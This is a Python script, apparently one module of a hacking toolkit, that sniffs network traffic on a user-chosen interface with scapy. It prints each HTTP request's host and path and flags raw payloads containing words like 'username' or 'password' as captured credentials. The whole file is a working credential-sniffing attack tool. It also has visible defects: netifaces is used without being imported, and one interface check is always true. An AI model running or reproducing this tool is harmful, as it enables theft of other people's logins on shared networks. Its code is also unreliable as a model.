#!/usr/bin/python3

# Imports all needed variables and packages
from assets.banners import packetsniffer_banner
from assets.designs import *
from assets.properties import clear_screen
import os
import scapy.all as scapy
from scapy.layers import http


# Main function
def packetsniffer_main():

    # Function that takes user input
    def configuration():
        try:
            os.system(clear_screen)
            print(logo)
            print('')
            print(line)
            print(packetsniffer_banner)
            print(line)
            print('')
            print(author)
            print('Configuration:')
            print('')
            ips()
            print('')
            while True:
                interface_set = input('\u001b[33mINTERFACE \u001b[37m> ').lower()
                sniff(interface_set)
        except KeyboardInterrupt:
            exit_shell()

    # Function that shows all available and unavailable interfaces
    def ips():
        x = netifaces.interfaces()

        for i in x:
            if i == 'wlan0' or i == 'wlan1' or i == 'wlan2' or i == 'wlan3' or i == 'mon0' or i == 'mon1' or i == 'mon2' or i == 'mon3' or i == 'wlp5s0' or i == 'wlp5s1' or i == 'wlp5s2' or i == 'wlp5s3' or i == 'eth0' or i == 'eth1' or i == 'eth2' or i == 'eth3':
                print('\n\t[+] Available Interface: ' + i)
            elif i != 'lo' or i != 'tun0' or i != 'tun1' or i != 'tun2' or i != 'tun3':
                print('\n\t[-] Unavailable Interface: ' + i)

    def sniff(interface):
        scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

    def get_url(packet):
        return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

    def get_login_info(packet):
        if packet.haslayer(scapy.Raw):
            load = str(packet[scapy.Raw].load)
            keywords = ["username", "user", "login", "password", "pass"]
            for keywords in keywords:
                if keywords in load:
                    return load

    def process_sniffed_packet(packet):
        if packet.haslayer(http.HTTPRequest):
            url = get_url(packet)
            print("HTTP Request >> " + url.decode())

            login_info = get_login_info(packet)
            if login_info:
                print("\n\n[+] Possible username/password > " + login_info + "\n\n")

    # Function that exit
    def exit_shell():
        from assets.functions import exit_main
        exit_main()

    configuration()


packetsniffer_main()
